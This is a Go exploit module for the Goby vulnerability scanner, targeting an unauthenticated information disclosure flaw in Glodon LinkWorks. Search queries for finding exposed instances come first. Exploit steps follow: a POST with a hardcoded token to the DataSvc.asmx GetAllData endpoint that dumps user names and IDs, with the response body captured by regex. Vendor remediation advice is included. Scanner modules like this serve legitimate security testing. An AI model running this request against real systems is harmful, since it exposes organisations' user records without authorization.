package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Glodon Linkworks /DataSvc.asmx Information Disclosure Vulnerability",
    "Description": "<p>LinkWorks collaborative work platform is a product developed by Glodon Technology Co., Ltd.</p><p> It mainly provides solutions for collaborative office, process control, communication and communication scenarios for enterprises.</p>",
    "Product": "Guanglianda-Linkworks",
    "Homepage": "https://www.glodon.com/",
    "DisclosureDate": "2023-09-19",
    "PostTime": "2024-03-20",
    "Author": "_白",
    "FofaQuery": "body=\"Services/Identification/login.ashx\" || body=\"\\\"GTPTDT.ASPX\\\"\" || body=\"images/GTP_Infobig.png\" || banner=\"Services/Identification/login.ashx\" || header=\"GTP_IdServer_LangID\"",
    "GobyQuery": "body=\"Services/Identification/login.ashx\" || body=\"\\\"GTPTDT.ASPX\\\"\" || body=\"images/GTP_Infobig.png\" || banner=\"Services/Identification/login.ashx\" || header=\"GTP_IdServer_LangID\"",
    "Level": "2",
    "Impact": "<p>There is an unauthorized access vulnerability in the LinkWorks collaborative office management platform of Glodon Technology Co., Ltd.</p><p>Attackers can exploit Information Disclosure vulnerabilities to obtain sensitive system information.</p>",
    "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "Token=!@#$asdf$#@!&DataType=user"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "USR_NAME",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "USR_ID",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "Token=!@#$asdf$#@!&DataType=user"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "USR_NAME",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "USR_ID",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<XML>(.*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure",
        "HW-2023"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.1",
    "Translation": {
        "CN": {
            "Name": "广联达 Linkworks /DataSvc.asmx 信息泄露漏洞",
            "Product": "广联达-Linkworks协同办公管理平台",
            "Description": "<p>LinkWorks协同工作平台是广联达梦龙软件有限公司开发的一款产品，它主要为企业提供协同办公、流程管控、沟通交流等场景的解决方案。<br><br></p>",
            "Recommendation": "<p>1、目前厂商已发布相关补丁，及时进行产品升级。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>广联达科技股份有限公司LinkWorks协同办公管理平台存在信息泄露漏洞。</p><p>攻击者可利用未授权访问漏洞获取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Glodon Linkworks /DataSvc.asmx Information Disclosure Vulnerability",
            "Product": "Guanglianda-Linkworks",
            "Description": "<p>LinkWorks collaborative work platform is a product developed by Glodon Technology Co., Ltd.</p><p> It mainly provides solutions for collaborative office, process control, communication and communication scenarios for enterprises.<br><br></p>",
            "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an unauthorized access vulnerability in the LinkWorks collaborative office management platform of&nbsp;Glodon Technology Co., Ltd.</p><p>Attackers can exploit Information Disclosure vulnerabilities to obtain sensitive system information.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
